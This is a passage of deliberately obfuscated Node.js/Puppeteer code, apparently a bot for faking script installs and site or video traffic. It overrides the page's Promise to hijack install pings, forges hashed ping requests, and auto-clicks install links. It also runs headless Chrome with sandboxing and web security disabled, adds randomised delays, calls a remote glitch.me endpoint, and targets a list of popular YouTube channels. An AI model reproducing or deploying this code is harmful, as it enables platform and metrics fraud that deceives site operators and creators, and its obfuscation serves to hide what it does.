(-0x1edd * 0x1 + 0x2 * 0x4c + -0x1 * -0x1ec5 | -0x1 * -0xf82 + -0x1bb4 + -0xf5 * -0xd & L) << y[-0x1194 + 0x2269 * -0x1 + 0x3400 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1 * 0x1a2d + 0x301 * -0x3 + 0x875 * -0x2 ? (this['block'] = P[0x905 + -0x1aa + 0x74b * -0x1], this['start'] = N - (0x17be + 0x133 + -0x15 * 0x12d), this['hash'](), this['hashed'] = -0x26b1 + 0x11 * -0x3d + 0x2abf) : this['start'] = N;
                }
                return this['bytes'] > -0x1f735ffd7 + 0x38fc9ba0 + -0x2ae2489 * -0x106 && (this['hBytes'] += this['bytes'] / (0x186a9fc * 0xc4 + -0x1afc857d * 0x4 + -0x1102154 * -0x3d) << -0x6 * -0x4f8 + -0x8d9 + -0x6fd * 0x3, this['bytes'] = this['bytes'] % (0x8b388d8 + 0x7242a * -0x1912 + 0x1aa551c1c)), this;
              }
            }
            ['finalize']() {
              const X = d;
              if (!this['finalized']) {
                this['finalized'] = 0x1498 + 0x1a05 * -0x1 + 0x8b * 0xa;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1105 + 0x1 * 0xd7e + -0x1e73 * 0x1] = this[X(0x19)], J[K >> -0x42 * -0xb + 0x1aba + -0x1d8e] |= x[-0x1f7c + 0x233d + -0x3be & K], this['block'] = J[-0x2b7 + 0x52 * -0x52 + -0x5cf * -0x5], K >= -0xa34 + -0x37 * 0x13 + 0xe81 * 0x1 && (this['hashed'] || this['hash'](), J[-0x3 * 0x783 + 0x9 * 0x381 + -0x900] = this['block'], J[-0x1fb4 + -0x126a + 0x2 * 0x1917] = J[-0x269f + 0x1f2f + 0x771] = J[-0x667 + -0x19d9 + 0x2042] = J[0x14dc + -0x14a0 + -0x39] = J[0x1dd9 + -0x2b * 0x18 + 0x19cd * -0x1] = J[0x1833 + -0x1eaf + 0x681] = J[-0x12 * -0x3 + -0x220a + -0x26b * -0xe] = J[-0x13e + -0x8 * -0x370 + -0x1a3b] = J[0x5c9 * -0x3 + 0x3 * -0xc2 + 0x13a9] = J[-0x1512 + -0x11cc * -0x1 + -0x79 * -0x7] = J[-0xee4 + 0x1 * -0x7d4 + 0x16c2] = J[-0x1b7 * 0x3 + 0x1875 + -0x1345 * 0x1] = J[0x2586 + 0xb5 * 0x2b + -0x43e1] = J[0x1 * -0x13f + 0x1 * -0xa07 + 0xb53] = J[0x25c3 + -0x244a + -0x16b] = J[-0x1fce + -0x2 * 0x613 + 0x2c03] = 0xcec + 0xc8b + 0x35 * -0x7b), J[-0x8 * -0x21e + -0xef * 0x3 + -0xe15] = this['hBytes'] << 0x1148 + 0x1fcd + -0x23b * 0x16 | this['bytes'] >>> -0xad9 + -0x122a + 0x2 * 0xe90, J[-0xaf3 * -0x3 + 0x82c * 0x2 + 0x14b * -0x26] = this['bytes'] << 0x8 * 0x41c + 0xa * -0x2d + -0x1f1b * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x6d3 * -0x3 + -0x1815 + 0x5 * 0xbc; J < -0x2478 + -0x44 * 0x65 + 0x3f9c; ++J)
                K = Q[J - (0x1be4 + -0x1 * 0x22f7 + 0x716)] ^ Q[J - (-0x1ef8 + 0x2029 + -0x129)] ^ Q[J - (0x1 * 0x1931 + 0x4d2 * 0x4 + -0x53 * 0x89)] ^ Q[J - (-0x223c + 0x17 * 0xfb + 0xbbf)], Q[J] = K << -0x16d3 + -0x1 * -0x93 + -0x1 * -0x1641 | K >>> 0xd3b + -0x1621 + 0x1 * 0x905;
              for (J = -0x1f07 + 0xa79 * -0x1 + 0x14c0 * 0x2; J < 0x10e7 * 0x1 + 0x6af + 0x11 * -0x162; J += 0x21a * 0x10 + 0x233c + -0x44d7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xac + -0x1cbb + 0x4ae * 0x6 | L >>> 0x1469 + -0x8c9 + 0x3 * -0x3d7) + (M & N | ~M & O) + P + (0x265dd * -0x2ff9 + 0x29e64f23 + -0xae995 * -0xeff) + Q[J] << 0x1 * 0x26cc + -0x69e + -0x202e * 0x1) << -0x1363 * -0x1 + -0x1 * -0x86d + -0x1bcb * 0x1 | P >>> 0x2196 + 0x1 * -0x85a + -0x1921) + (L & (M = M << -0x1648 * 0x1 + -0x75 * -0x36 + -0x248 | M >>> 0x12bf * 0x2 + 0x1 * 0x1747 + -0x3cc3) | ~L & N) + O + (0xc08e94 + -0x76f7e1c1 + 0xd0b9ccc6) + Q[J + (0xdcb + -0xe0 + -0xae * 0x13)] << -0xa3 * -0x5 + -0x944 + 0x615) << -0xa6 + -0xfb3 * 0x2 + -0x2011 * -0x1 | O >>> -0x181a + -0x1886 + -0x1f3 * -0x19) + (P & (L = L << -0x15f3 * 0x1 + 0x118a + -0x13 * -0x3d | L >>> 0x1 * -0xc2e + -0x1 * -0x1ea9 + -0x1 * 0x1279) | ~P & M) + N + (0xf79 * -0x382eb + -0x180fbc67 + 0x13ee5 * 0x8797) + Q[J + (0x13ae + -0x26a9 + 0x12fd)] << -0x1402 + 0x1 * 0x8ab + 0xb57) << 0x111e + -0x1d56 + 0xc3d | N >>> 0x5cb + 0x31 * 0x7d + -0x1d9d) + (O & (P = P << -0x17aa + 0x2 * -0x821 + -0xa * -0x401 | P >>> 0x4 * 0x4bc + 0x24da + -0x37c8) | ~O & L) + M + (-0xa8e2777e + 0x7b339a18 + 0x7 * 0x1374c349) + Q[J + (-0x3 * -0x47f + -0x19d4 + 0xc5a)] << 0x1d74 + 0x59f * -0x1 + -0x17d5) << 0x107e + -0x109 * 0x1f + 0xf9e * 0x1 | M >>> -0x85 * -0x2a + 0x14a * -0x4 + -0x108f) + (N & (O = O << 0x1 * 0x63a + 0x1 * 0x1271 + -0x188d | O >>> 0x266 * -0xa + -0x38a + 0x1b88) | ~N & P) + L + (0x3d0b9f37 + -0xb066f58a + -0x66eee7f6 * -0x2) + Q[J + (-0xbe + -0x7 * -0x203 + 0xd53 * -0x1)] << -0x11cf + -0x4d * 0x29 + 0x1e24 * 0x1, N = N << 0x4 * 0x373 + 0xd8 + -0x8f * 0x1a | N >>> -0x2081 + 0x139b + 0xce8;
              for (; J < 0x10f5 + -0x515 * 0x2 + -0x6a3; J += 0x1 * 0x2513 + 0x263f + -0x4b4d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xf * 0x58 + -0x19d1 + 0x14ae | L >>> -0x208c + -0xa84 + 0x1 * 0x2b2b) + (M ^ N ^ O) + P + (-0x7a * 0x135db3d + -0xce70d7a5 + 0x1d0f53e58) + Q[J] << 0x21c9 + 0x46d + -0x2636) << 0x79 * -0xe + 0x114b * 0x2 + 0x31b * -0x9 | P >>> 0x4c * -0x3f + -0x2 * -0x742 + 0x1 * 0x44b) + (L ^ (M = M << -0x3 * -0x1a3 + 0x3 * -0x175 + -0x6c | M >>> 0x1e7f + -0x52e * -0x3 + -0x2e07) ^ N) + O + (-0x6a5f8089 + -0x14 * 0x758e3be + 0x16c2b3702) + Q[J + (-0x42 * -0x88 + 0x12a4 + -0x35b3)] << 0x334 * 0x7 + 0x7f * -0x29 + -0x215) << 0x13ce + 0x3 * -0x58a + -0x32b * 0x1 | O >>> 0x3 * 0xcc9 + -0x19c * -0x1 + -0x2 * 0x13ee) + (P ^ (L = L << -0x234 + 0x19d4 + 0x33 * -0x76 | L >>> 0xd * -0x227 + 0x211 * 0x1 + -0x67b * -0x4) ^ M) + N + (0x1 * -0x90791986 + 0x64ed4dea + -0x25 * -0x42c4339) + Q[J + (0xfbc + 0xa * 0x40 + -0x123a)] << -0x2b5 * 0x3 + 0x6 * 0x5b + 0x7 * 0xdb) << -0x3 * -0x8dd + 0x2360 + -0x3 * 0x14a6 | N >>> 0x57c + 0x17bc + 0x101 * -0x1d) + (O ^ (P = P << -0xb1 * 0x2 + 0x1e5a + -0x1cda | P >>> -0x603 + -0xcd * 0x2f + -0x4 * -0xaea) ^ L) + M + (0x4654960f + 0x1 * 0xca51d34b + -0xa1cc7db9) + Q[J + (-0x49 * 0x6f + 0x1 * -0x621 + 0x25cb)] << 0x1380 + 0x3b * 0x1 + 0x13bb * -0x1) << 0x2f8 + -0xf6f + 0xc7c | M >>> -0x21be + 0x2 * 0xce0 + 0x819 * 0x1) + (N ^ (O = O << 0x6ba + -0x8f + -0x60d | O >>> 0x7ec + -0x1f57 + 0x176d) ^ P) + L + (0x9eca509d * -0x1 + 0xccf21c13 + -0x40b2202b * -0x1) + Q[J + (0x1 * 0x40d + 0x2 * -0x103f + 0x1c75)] << -0x2 * 0xf67 + 0x7 * 0x7b + -0x119 * -0x19, N = N << 0xe0c + -0x1fc2 + -0x2 * -0x8ea | N >>> 0xf1 * -0x1 + -0x7 * -0x19 + 0x44;
              for (; J < -0x1eeb + 0x2ef * -0x1 + -0x2 * -0x110b; J += 0x8d * 0xe + 0xc25 * 0x1 + 0x9eb * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xab1 + 0x22cb + -0x67 * 0x71 | L >>> -0x5b * 0x7 + -0x1 * -0x1862 + 0x15ca * -0x1) + (M & N | M & O | N & O) + P - (-0x3 * 0x3779dce5 + -0xc7ef737 + 0x123d0d10a) + Q[J] << -0xd46 + -0x1a * -0x3a + 0xd2 * 0x9) << 0x1eb9 + -0x7 * -0x55b + -0x633 * 0xb | P >>> 0x2602 + -0xceb + -0x42a * 0x6) + (L & (M = M << -0x4 * 0x98c + 0x22a0 + 0x3ae | M >>> -0x26 + -0x47 * -0x32 + -0xdb6) | L & N | M & N) + O - (-0x6c5f * -0xbba3 + 0x70b748c0 + 0x1 * -0x4f416b19) + Q[J + (-0x13 * -0xc4 + -0x1521 * -0x1 + 0x5f2 * -0x6)] << 0x15d * 0xd + -0x1 * -0xf55 + -0x210e) << 0x96c * -0x2 + -0x13ca + 0x26a7 | O >>> 0x1d46 + -0x1a2c + -0x2ff) + (P & (L = L << 0x1 * 0x849 + 0x936 + -0x5cb * 0x3 | L >>> -0x6bc * 0x1 + 0x2fb + 0x3c3) | P & M | L & M) + N - (0x7310f9b1 * -0x1 + -0x9496b82e + 0x1788bf503 * 0x1) + Q[J + (-0x1dfe + -0xa26 * 0x3 + 0x3c72)] << -0x2518 + -0x766 * 0x5 + 0x4a16) << -0x1796 + -0x11e3 + -0x2 * -0x14bf | N >>> 0x544 * -0x1 + 0x5bd * -0x1 + 0xb1c) + (O & (P = P << -0x91 + -0x1725 + 0x5f5 * 0x4 | P >>> -0x334 + -0xc89 * 0x1 + 0xfbf * 0x1) | O & L | P & L) + M - (-0xa5f67e69 + -0xb44eff26 + 0x1cb29c0b3) + Q[J + (0x378 * 0x7 + 0x260 * -0x2 + -0x107 * 0x13)] << -0x1 * 0x23b2 + -0x1 * 0x4f + 0x2401) << 0x4 * 0xd + 0x21df + -0x1107 * 0x2 | M >>> -0x2219 + 0x77 * -0x1f + 0x309d) + (N & (O = O << 0x13be + -0x3 * -0xb4 + -0x15bc | O >>> 0x1196 * -0x1 + 0x251 * -0xe + 0x3206) | N & P | O & P) + L - (0x35c3fd23 * -0x1 + 0x157f * -0x1103d + 0xbd844f8a) + Q[J + (-0x4d7 + 0x786 + -0x2ab)] << -0xec3 * 0x2 + -0x9ea + 0x2770, N = N << 0x7 * 0x10a + -0x5 * -0x733 + -0x2b27 | N >>> 0x1 * -0x1f49 + 0x2d * 0x2d + 0x1762;
              for (; J < 0x17c + -0x1240 + 0x1114; J += -0x486 + 0x2 * -0xb2 + 0x5ef * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1de + 0x2110 + 0x1 * -0x1f2d | L >>> 0x273 * -0x1 + -0x1f99 + 0x2227) + (M ^ N ^ O) + P - (-0x5565daa4 + 0x2babd31f + 0x3 * 0x1fc7c1e5) + Q[J] << 0x42 * -0x5e + -0x16f9 * -0x1 + -0x1 * -0x143) << -0x15e5 + -0x4 * -0x6c + 0x143a | P >>> -0x1ffb + 0x37f + -0x233 * -0xd) + (L ^ (M = M << 0x304 * 0x7 + 0x5 * 0x481 + -0x2f * 0xed | M >>> 0x393 + -0xf75 + -0x4 * -0x2f9) ^ N) + O - (0x270641c9 + -0xe * -0x696a816 + -0x4da634d3) + Q[J + (-0xb * 0x29d + -0x5d7 + -0xa1 * -0x37)] << 0x1 * 0x1ef4 + 0x15a1 + -0x3495) << -0x5ad * 0x3 + 0x93c + -0x8 * -0xfa | O >>> -0xb * -0x140 + -0xe33 + 0x8e) + (P ^ (L = L << 0x1c8c + -0x7f4 + -0x147a | L >>> 0xb86 + 0x2 * 0x281 + -0x34e * 0x5) ^ M) + N - (-0x4e8a9d79 + -0x15c83c2d * -0x1 + 0x10da2 * 0x68cb) + Q[J + (-0x137 * -0x15 + 0x1203 + 0xa * -0x45a)] << -0xd7d + 0x4a * 0x40 + 0x1 * -0x503) << 0x29 * 0x93 + 0x3 * -0x964 + 0x7 * 0xaa | N >>> -0x1a8 * 0x2 + -0x21a9 + 0x2514) + (O ^ (P = P << 0x1b55 * 0x1 + 0x1e9a + -0x39d1 | P >>> -0xe4f + -0x1 * -0x243d + -0x15ec) ^ L) + M - (0x2da12191 + 0x7fc3860 + -0x1 * 0x1bc7) + Q[J + (0x104b * 0x2 + 0x235b * 0x1 + 0x172 * -0x2f)] << 0x1 * -0x227f + -0x2af * -0x7 + -0x7db * -0x2) << 0x1f27 + -0x1 * 0x7fb + -0x1727 | M >>> 0x1 * -0x7 + 0x1c * 0x89 + -0xeda) + (N ^ (O = O << 0x143 * -0x1c + 0x1256 * -0x1 + 0x35c8 | O >>> -0x5 * -0x2ff + -0x10 * 0x17b + 0x8b7) ^ P) + L - (0x13ccb3c1 + 0x3f7 * -0xe54a5 + 0x3 * 0x1e360c34) + Q[J + (-0x22e3 + 0x2428 + -0x6b * 0x3)] << -0x1a8b + 0x9 * -0x3b6 + 0x573 * 0xb, N = N << -0x2f1 * -0xd + -0x21b * 0x7 + -0x1762 | N >>> -0x1 * -0x2218 + -0x5e3 * 0x3 + 0x349 * -0x5;
              this['h0'] = this['h0'] + L << -0x26e5 + -0x6c3 + 0x1 * 0x2da8, this['h1'] = this['h1'] + M << -0x5e * -0x1 + 0x1cac + -0x1d0a, this['h2'] = this['h2'] + N << -0x2537 + 0x1538 + 0xfff, this['h3'] = this['h3'] + O << 0x1 * 0xd67 + 0x2b * -0x29 + 0x4 * -0x1a1, this['h4'] = this['h4'] + P << -0x8a0 + -0x1 * -0x1742 + -0xea2;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2f8 + 0x2123 + -0x1e0f & 0x1 * -0x1843 + 0x5 * 0x35f + -0x15 * -0x5b] + w[J >> -0x20 * 0xe5 + -0x498 * 0x2 + -0x8 * -0x4bd & 0x5e + 0x169 * 0xb + -0xfd2] + w[J >> 0xa64 + -0x3 * -0x17f + 0x4ef * -0x3 & 0xa * 0x1f6 + 0x1c08 + -0x2f95] + w[J >> -0x9d * 0x7 + -0xe3d + 0x1298 & 0x1459 + -0x1 * -0x2356 + -0x37a0] + w[J >> 0x7aa + 0xe1b * 0x1 + -0x15b9 & -0x1243 * 0x2 + -0x25ae + -0x1 * -0x4a43] + w[J >> 0x1 * -0x21f6 + -0x388 * -0xa + -0x152 * 0x1 & -0x1d9c + -0x7 * 0x224 + 0x7 * 0x661] + w[J >> -0x1b5c + 0x19f7 * -0x1 + -0x1 * -0x3557 & -0x34 * -0xa1 + -0x2 * -0x51b + -0x2adb] + w[-0x65b * -0x1 + 0x208f * -0x1 + 0x1a43 & J] + w[K >> -0x1dd * -0x1 + -0x240c + 0x224b & -0xccf * -0x2 + 0x3 * 0x7d8 + -0xb1 * 0x47] + w[K >> 0x1 * 0x2501 + -0xaee + 0x2e3 * -0x9 & -0x12cf + 0x1434 + -0x156] + w[K >> -0xc * -0x25f + 0x886 + -0x24e6 & 0xce * 0x26 + 0x2 * -0x9de + 0xac9 * -0x1] + w[K >> -0x13f * 0x7 + -0xda0 + 0x1669 & 0x1f8c + -0x2334 + 0x3b7] + w[K >> -0x1a7f + 0x355 * 0x7 + 0x4 * 0xce & 0x1a38 + -0x13cf + -0x65a] + w[K >> 0x14e7 + 0x211 + -0x8 * 0x2de & -0x74 + -0xbf0 + 0xc73] + w[K >> 0x1 * 0x24df + 0x1323 + 0x955 * -0x6 & 0x2605 + 0x599 * 0x3 + 0x1 * -0x36c1] + w[-0x11 * 0x79 + 0x11af + -0x997 * 0x1 & K] + w[L >> 0x1699 + 0xcf8 + 0x2375 * -0x1 & -0xc5b + -0x6f8 + 0x1362] + w[L >> 0x12 * -0x161 + 0x84e + 0x109c & 0xc95 + -0x1c96 * -0x1 + -0x291c] + w[L >> 0x22d1 + -0x1e41 + -0x47c & 0x22bd + 0x20bc + -0x436a * 0x1] + w[L >> -0x2 * -0x67f + 0x1 * 0x1c26 + -0x2914 & 0x16dc + 0x215b + -0x3828] + w[L >> -0x1e8f + 0x1 * 0xee5 + -0x7db * -0x2 & 0x540 + 0x41e + 0x1 * -0x94f] + w[L >> 0x1c5d + -0x1c6c * 0x1 + 0x17 & 0x4 * 0x568 + 0x1 * -0xd1b + 0x169 * -0x6] + w[L >> -0x2302 + 0x1f23 * -0x1 + -0x4229 * -0x1 & -0xf33 + 0x1 * 0xe36 + 0x10c] + w[-0x1 * -0x981 + -0x1e28 + 0x1 * 0x14b6 & L] + w[M >> -0x2011 + -0x12b6 + 0x1 * 0x32e3 & 0x11f1 + -0x2162 + 0xf80] + w[M >> 0x16 * 0x8e + 0x3 * 0xc73 + -0x3175 & -0x24d0 + 0x871 + -0x97a * -0x3] + w[M >> -0x21e2 + 0xda * -0x2b + -0x2 * -0x234a & 0x1f3b + -0x246c + -0x4 * -0x150] + w[M >> -0x277 * 0x6 + -0xe81 + 0x1d5b & 0x240a + -0xb9d + -0x185e] + w[M >> -0x153d + 0x28 * 0x7b + 0x211 & 0x20fc * -0x1 + 0xa * -0x26b + 0x39 * 0x101] + w[M >> 0x183d + -0x144f + -0x3e6 & -0x1 * -0x20d8 + 0x25 * -0x3f + -0x17ae] + w[M >> 0x19c9 * 0x1 + -0x1 * 0x263f + 0xc7a * 0x1 & -0xd3 * 0x2f + -0x1152 + -0x28d * -0x16] + w[-0x6e2 * 0x5 + -0xd93 + 0x300c & M] + w[N >> -0xb * 0x10f + 0x18 * -0x68 + 0x72b * 0x3 & -0x1 * -0x14e3 + 0x141 + 0x1615 * -0x1] + w[N >> -0x106a + 0xc7b * -0x1 + 0x1cfd & 0x267 * -0x7 + 0x62b * 0x1 + -0xab5 * -0x1] + w[N >> 0x267e + -0x7a * 0x22 + 0x1 * -0x1636 & 0xc11 * 0x3 + 0xce3 + -0x3107] + w[N >> -0xf6b + -0x370 * -0x2 + -0x89b * -0x1 & -0x14d7 + -0xc6c + 0x355 * 0xa] + w[N >> 0x1 * -0x1514 + 0x115a + 0x3c6 & -0x5d6 + -0x706 + 0xceb] + w[N >> 0x5 * -0x737 + 0x1be8 + 0x833 * 0x1 & -0x19d * 0x5 + -0x164f * -0x1 + -0xe2f] + w[N >> 0x10db * 0x1 + 0x104b * 0x1 + -0x2122 & 0xbf * -0x4 + -0x2 * 0x10c + 0x1 * 0x523] + w[-0x7 * 0xcb + -0x7 * 0xe9 + 0xbfb & N];
            }
            [Y(0x17)]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x30 * 0x3 + -0x81b * -0x2 + 0x2 * -0x7c7 & 0x55d + -0xc7 * 0x1b + -0x25 * -0x73,
                J >> 0xf7b + -0x3 * -0x44f + -0x1c58 & 0x85 * 0x11 + -0xd * 0xe0 + 0x38a,
                J >> 0x2146 + 0x2 * 0x8a5 + -0x3288 & 0x2623 + 0xd3e + -0x3262 * 0x1,
                0x10a9 + -0x1075 * 0x1 + 0x7 * 0x1d & J,
                K >> 0x1192 + 0x74b * 0x4 + -0x2ea6 & 0x49 + 0x1 * -0x116f + 0x1225,
                K >> 0x208a + -0x1ca7 + -0x3d3 & -0x1796 + -0x1418 + -0x1 * -0x2cad,
                K >> 0x1a5f + 0x4a5 + -0x1efc & 0x1 * -0x264b + -0x1e2 * 0xe + 0x41a6,
                -0x632 + 0x61 * -0x17 + -0x2 * -0x7f4 & K,
                L >> -0x83b + -0x1816 + 0x2069 & 0x1 * 0xb89 + -0x9df + -0xab,
                L >> 0x7 * -0x215 + 0x1 * -0x25 + 0x764 * 0x2 & 0x1 * -0x1f76 + 0x16 * 0x14f + 0x3ab,
                L >> -0x1a7b + -0x18c3 + 0x3346 & 0x6e9 * -0x4 + -0x3 * -0x825 + 0x434,
                -0x11d7 * 0x1 + 0x199 * -0xc + 0x8b * 0x46 & L,
                M >> 0x1 * 0x1bc3 + -0x1620 + -0x58b & -0x98f * -0x3 + 0x28d * -0x3 + -0x1407,
                M >> 0x4 * 0x388 + 0x7ff + -0x1 * 0x160f & -0x3 * 0x7f + -0x1896 + 0xd2 * 0x21,
                M >> -0x1983 + 0x2 * -0x2e7 + 0x1f59 & -0x26c2 + -0x1b7d + 0x433e,
                -0x2388 + 0x258b + -0x104 & M,
                N >> 0x2 * -0xc44 + -0x1aeb + 0x91 * 0x5b & 0x136 * -0x16 + 0x1 * 0xbcb + 0xfd8,
                N >> -0x3 * -0x9d5 + 0x9 * 0x41d + 0x4 * -0x109d & -0x1e07 + -0x1 * -0x14db + 0x1 * 0xa2b,
                N >> 0x265f + 0x118f + -0x37e6 & -0xdb8 + 0x62 * 0x49 + -0x1 * 0xd3b,
                0xd2d + 0x160b + 0x1 * -0x2239 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xb * -0x2bd + 0x2 * -0x10a3 + 0x33b), (K = new DataView(J))['setUint32'](-0x353 + -0x94b + 0xc9e, this['h0']), K['setUint32'](0x238f + 0x1 * -0x1229 + 0x1bd * -0xa, this['h1']), K['setUint32'](0xa43 + 0x9f * 0x2e + -0x12d * 0x21, this['h2']), K['setUint32'](0x100 + 0x1841 + -0x1935, this['h3']), K['setUint32'](-0x269d + -0x625 + 0x2cd2 * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1b0f + -0x12e3 + 0x4 * -0x20b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xf8e + -0x18 * 0x8e + -0x7 * 0x52;
            J[-0x1 * -0x1ab2 + -0xd * 0x12 + -0x19c8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x4a6 + 0x9d1 * -0x3 + 0x4df * 0x7] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x21f + -0x1705 + -0x1925 * -0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1 * 0x1132 + 0xf72 + -0x20a3;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x771 * -0x1 + 0x3b * 0x23 + -0x9a6), Promise['resolve'](-0xb66 + -0x612 + 0x1179);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1bd9 * 0x1 + -0x1742 + 0x331b; j < -0x1b56 + 0x5 * 0x743 + -0x8f8; j++)
    i();
}
const NETWORK_PATIENCE = -0x8ee + -0x2 * -0x2d7 + 0x2280 + (0x1f * 0x4d + 0x120d + 0x2 * -0x7d4) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * -0x13ed + 0x1 * 0x246 + 0x11aa) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      Z(0x26) + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    Z(0x22) + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x56c + 0x13f * 0x2 + 0x1 * -0x7ea; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function a() {
  const bt = [
    'Kit/537.36',
    'zgL1Bs5JB20Vqa',
    'vHNdLCkSWR8E',
    'goto\x20chann',
    'ate,\x20br',
    'restrictio',
    'WRTgWPLvnWFcLd/cHsa',
    'WOldRuiZW7PXcGipWR4',
    'zwfZEwzVCMSUBW',
    'ById',
    'mJGGtw9IAwXLia',
    'DxnLugX1z2LUCW',
    'cgmsW7zLW7GIqCkzWR4',
    'mcaOv2LUzg93CW',
    'vanillaLau',
    'DI55Dc1ZCgvJlq',
    'mgrJntG3n2u5oa',
    'DgeGA2LSBcXTBW',
    'clicking..',
    'W6pdMuhcMZ/cLcSnbmkD',
    'W7/dU8oYWRlcL8kEeYxdUSkr',
    ';\x20SM-G960U',
    'e/apng,*/*',
    'zgLNzxn0',
    'WRNcV8keW7rrcIRdQmkSW5e',
    'block',
    'WRdcLCokqSk0WP7dUmoPte8',
    'headers',
    'W5pdHIHgW4NcP8o2',
    '9yjZpBq1XB',
    'rbeast\x20sun',
    'CMCVzw4VC2nYAq',
    'e/*',
    'pts/424655',
    'Ahr0Chm6lY93DW',
    'W4VcJufpb8k3W4yGWQldIG',
    'lwfNyxiTAw8TCW',
    'WQ8laLpcVSo5W5OXACke',
    'ls1KAxnHyMXLlq',
    'rk.glitch.',
    'DMfUAwXSyujYBW',
    'WPmOWRVdHSoYW5NdV8k8WP89',
    'rLpcJSodW4fgm3xcLgK'
  ];
  a = function() {
    return bt;
  };
  return a();
}
let searchTerms = [];
